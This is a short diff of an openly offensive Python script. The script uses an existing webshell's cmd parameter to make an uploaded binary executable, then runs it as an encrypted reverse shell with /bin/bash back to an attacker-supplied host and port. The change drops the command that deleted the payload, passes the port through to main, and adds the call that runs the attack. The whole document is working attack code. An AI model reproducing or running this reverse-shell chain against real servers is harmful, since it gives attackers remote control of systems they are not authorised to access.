@@ -62,8 +62,7 @@ def get_reverse_shell(webshell, lhost, lport, payload):
     payload_path = f'/var/www/html/{payload}'
     print(f'[*] Sending encrypted reverse shell to {lhost}:{lport}')
     cmd = f'chmod 777 {payload_path} &&'
-    cmd = f'{cmd} {payload_path} OPENSSL:{lhost}:{lport},verify=0 EXEC:/bin/bash,pty,stderr,sigint,setsid,sane;'
-    cmd = f'{cmd} rm -f {payload_path}'
+    cmd = f'{cmd} {payload_path} OPENSSL:{lhost}:{lport},verify=0 EXEC:/bin/bash,pty,stderr,sigint,setsid,sane'
     encoded_cmd = urllib.parse.quote(cmd, safe="")
     try:
         res = get(f'{webshell}?cmd={encoded_cmd}', verify=False)
@@ -73,7 +72,7 @@ def get_reverse_shell(webshell, lhost, lport, payload):
         print(f'[*] Finished executing interactive shell')
     return 'Success'
     
-def main(webshell, lhost):
+def main(webshell, lhost, lport):
     payload = upload_bin(webshell, lhost)
     if payload is None:
         print('[*] - Err: Could not upload payload to target\'s /tmp')
@@ -91,4 +90,5 @@ if __name__ == '__main__':
     webshell  = args.url.strip()
     lhost = args.lhost.strip().lower()
     lport = args.lport
+    main(webshell, lhost, lport)
 
